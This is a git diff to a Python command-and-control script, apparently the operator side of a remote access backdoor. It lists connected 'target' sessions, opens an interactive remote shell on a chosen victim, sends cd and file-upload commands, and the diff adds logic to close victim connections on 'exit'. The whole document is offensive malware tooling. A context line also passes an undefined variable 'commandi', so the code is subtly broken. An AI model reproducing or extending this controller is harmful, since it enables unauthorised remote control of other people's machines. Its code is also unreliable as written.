@@ -25,16 +25,21 @@ def server():
 
 def displayQueueIps(queue_ips):
     count = 0
-    for ip in ips:
+    for ip in queue_ips:
         print("Session {} <----> {}".format(str(count), str(ip)))
         count += 1
+
+def closeEachTargetsConnection(targets_sockets):
+    for target_socket in targets_sockets:
+        target_socket.close()
+
 
 def callShellForAClient(command):
     try:
         index_session = int(command[8])
         target_socket = targets_socket[index_session]
         target_ip = queue_ips[index_session]
-        shell(target_socket, target_ip)
+        shell(target_socket, target_ip, targets_socket, queue_ips)
     except:
         print("No sessions under that number")
 
@@ -74,13 +79,18 @@ def concatenateUploadMessageAndFileUploadContent(command, content):
     return command + " | " + content
 
 
-def shell(target, ip):
+def shell(target, ip, targets_socket, queue_ips):
     count_screen = 1
     while True:
         command = input("Shell#~{}:".format(ip))
         print("command -> {}".format(command))
         if command == 'q':
-            continue
+            break
+        elif command == 'exit':
+            target.close()
+            targets_socket.remove(target)
+            queue_ips.remove(ip)
+            break
         elif len(command) > 1 and command[:2] == "cd":
             reliable_send(commandi, target)
             #ça veut dire qu'on veut changer de fichier donc il ne faut as attendre de réponse
@@ -141,3 +151,9 @@ while True:
     elif command[:7] == "session":
        callShellForAClient(command)
 
+    elif command == "exit":
+        closeEachTargetsConnection(targets_socket)
+        s.close()
+        stop_threads = True
+        thread_manager.join()
+        break
